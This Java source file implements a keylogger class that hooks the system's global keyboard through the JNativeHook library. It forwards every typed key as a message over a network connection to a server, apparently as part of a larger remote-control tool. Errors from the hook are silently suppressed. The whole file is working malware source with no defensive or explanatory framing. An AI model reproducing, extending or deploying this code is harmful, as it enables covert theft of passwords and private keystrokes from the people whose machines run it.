package keylogger;

import network.Connection;
import network.Message;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    boolean isRunning = false;
    Connection server;
    static KeyLogger instance;

    public static KeyLogger getInstance(Connection c) {
        if(instance == null) {
            instance = new KeyLogger(c);
        }
        return instance;
    }

    public KeyLogger(Connection c) {
        this.server = c;
        instance = this;
    }

    public void start() {
        if(!isRunning) {
            try {
                GlobalScreen.addNativeKeyListener(instance);
                GlobalScreen.registerNativeHook();
            } catch(NativeHookException e) {
                // Silence is golden
                isRunning = false;
            }
            isRunning = true;
        }
    }

    public void stop() {
        if(isRunning) {
            try {
                GlobalScreen.removeNativeKeyListener(instance);
                GlobalScreen.unregisterNativeHook();
                isRunning = false;
            } catch(NativeHookException e) {
                // Silence is golden
            }
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        Message keyPressed = new Message("key-typed", nativeKeyEvent);
        server.sendMessage(keyPressed);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
